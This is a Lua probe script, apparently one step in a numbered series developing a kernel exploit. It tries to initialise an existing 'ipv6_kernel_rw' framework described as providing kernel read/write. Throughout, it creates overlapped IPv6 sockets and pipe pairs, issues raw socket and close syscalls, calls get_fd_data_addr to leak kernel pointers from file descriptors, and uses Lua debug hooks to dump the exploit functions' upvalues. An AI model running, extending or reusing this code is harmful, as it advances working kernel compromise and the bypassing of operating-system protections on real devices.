-- CRASH_CLASS: MODERATE
-- PROBE 125a: Initialize the ipv6_kernel_rw framework
-- 89d revealed a complete ipv6 kernel R/W framework in the loader:
--   ipv6_kernel_rw.init, create_overlapped_ipv6_sockets, ipv6_kread/kwrite
--   get_fd_data_addr, copyin, copyout, create_pipe_pair
-- The framework needs initialization. This probe attempts to:
-- 1. Call ipv6_kernel_rw.init() to set up the exploit
-- 2. Use get_fd_data_addr to leak kernel pointers from file descriptors
-- 3. If init fails, examine why and what prerequisites are missing

print("=== PROBE 125a: IPV6 KRW INIT ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

-- Section A: Examine ipv6_kernel_rw.data table
print("")
print("--- SECTION A: IPV6_KERNEL_RW DATA ---")
if ipv6_kernel_rw and ipv6_kernel_rw.data then
    for k, v in pairs(ipv6_kernel_rw.data) do
        print(string.format("  data.%s = %s (%s)", tostring(k), tostring(v), type(v)))
    end
    local count = 0
    for _ in pairs(ipv6_kernel_rw.data) do count = count + 1 end
    print("data_keys=" .. count)
else
    print("ipv6_kernel_rw.data missing or nil")
end

-- Section B: Examine storage.data
print("")
print("--- SECTION B: STORAGE DATA ---")
if storage and storage.data then
    for k, v in pairs(storage.data) do
        print(string.format("  storage.data.%s = %s (%s)", tostring(k), tostring(v), type(v)))
    end
end

-- Section C: Try ipv6_kernel_rw.init()
print("")
print("--- SECTION C: INIT ATTEMPT ---")
local ok_init, ret_init = pcall(function()
    return ipv6_kernel_rw.init()
end)
print("init(): ok=" .. tostring(ok_init) .. " ret=" .. tostring(ret_init))
if not ok_init then
    print("init error: " .. tostring(ret_init))
end

-- Section D: Try create_pipe_pair
print("")
print("--- SECTION D: PIPE PAIR ---")
local ok_pipe, ret_pipe = pcall(function()
    return ipv6_kernel_rw.create_pipe_pair()
end)
print("create_pipe_pair: ok=" .. tostring(ok_pipe) .. " ret=" .. tostring(ret_pipe))
if ok_pipe and type(ret_pipe) == "table" then
    for k, v in pairs(ret_pipe) do
        print(string.format("  .%s = %s", tostring(k), tostring(v)))
    end
end

-- Section E: Try create_overlapped_ipv6_sockets
print("")
print("--- SECTION E: OVERLAPPED SOCKETS ---")
local ok_sock, ret_sock = pcall(function()
    return ipv6_kernel_rw.create_overlapped_ipv6_sockets()
end)
print("create_overlapped: ok=" .. tostring(ok_sock) .. " ret=" .. tostring(ret_sock))
if ok_sock and type(ret_sock) == "table" then
    for k, v in pairs(ret_sock) do
        print(string.format("  .%s = %s", tostring(k), tostring(v)))
    end
end

-- Section F: Try get_fd_data_addr with known fds
print("")
print("--- SECTION F: GET FD DATA ADDR ---")
-- Create a socket to get an fd
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local sc_socket = make_syscall(97)
local sc_close = make_syscall(6)

local ok_s, test_fd = pcall(function()
    return sc_socket(uint64(2), uint64(1), uint64(0))
end)
local fd_val = ok_s and to_num(test_fd) or -1
print("test_fd=" .. fd_val)

if fd_val >= 0 then
    -- Try get_fd_data_addr with this fd
    local ok_gfd, ret_gfd = pcall(function()
        return ipv6_kernel_rw.get_fd_data_addr(fd_val)
    end)
    print("get_fd_data_addr(" .. fd_val .. "): ok=" .. tostring(ok_gfd))
    if ok_gfd then
        local h, l = get_hi_lo(ret_gfd)
        print(string.format("  result=0x%08X%08X", h, l))
        if h >= 0xFFFF8000 then
            print("  *** KERNEL POINTER FOUND ***")
        end
    else
        print("  error: " .. tostring(ret_gfd))
    end
    pcall(function() sc_close(test_fd) end)
end

-- Try with fd 0, 1, 2
for fd = 0, 2 do
    local ok_g, ret_g = pcall(function()
        return ipv6_kernel_rw.get_fd_data_addr(fd)
    end)
    if ok_g then
        local h, l = get_hi_lo(ret_g)
        print(string.format("get_fd_data_addr(%d)=0x%08X%08X", fd, h, l))
    else
        print(string.format("get_fd_data_addr(%d) error: %s", fd, tostring(ret_g)))
    end
end

-- Section G: Read the source code of init function
print("")
print("--- SECTION G: INIT SOURCE ---")
local di = debug.getinfo(ipv6_kernel_rw.init, "SLnu")
print("init: src=" .. tostring(di.source) .. " line=" .. tostring(di.linedefined)
    .. " lastline=" .. tostring(di.lastlinedefined) .. " nups=" .. tostring(di.nups))

-- Check upvalues of init
for i = 1, (di.nups or 0) do
    local name, val = debug.getupvalue(ipv6_kernel_rw.init, i)
    print(string.format("  up[%d] %s = %s (%s)", i, tostring(name), tostring(val), type(val)))
end

-- Section H: Read source of get_fd_data_addr
print("")
print("--- SECTION H: GET_FD_DATA_ADDR SOURCE ---")
local di2 = debug.getinfo(ipv6_kernel_rw.get_fd_data_addr, "SLnu")
print("get_fd_data_addr: src=" .. tostring(di2.source) .. " line=" .. tostring(di2.linedefined)
    .. " lastline=" .. tostring(di2.lastlinedefined) .. " nups=" .. tostring(di2.nups))
for i = 1, (di2.nups or 0) do
    local name, val = debug.getupvalue(ipv6_kernel_rw.get_fd_data_addr, i)
    print(string.format("  up[%d] %s = %s (%s)", i, tostring(name), tostring(val), type(val)))
end

-- Section I: Read source of ipv6_kread
print("")
print("--- SECTION I: KREAD SOURCE ---")
local di3 = debug.getinfo(ipv6_kernel_rw.ipv6_kread, "SLnu")
print("ipv6_kread: src=" .. tostring(di3.source) .. " line=" .. tostring(di3.linedefined)
    .. " lastline=" .. tostring(di3.lastlinedefined) .. " nups=" .. tostring(di3.nups))
for i = 1, (di3.nups or 0) do
    local name, val = debug.getupvalue(ipv6_kernel_rw.ipv6_kread, i)
    print(string.format("  up[%d] %s = %s (%s)", i, tostring(name), tostring(val), type(val)))
end

print("=== PROBE 125a COMPLETE ===")
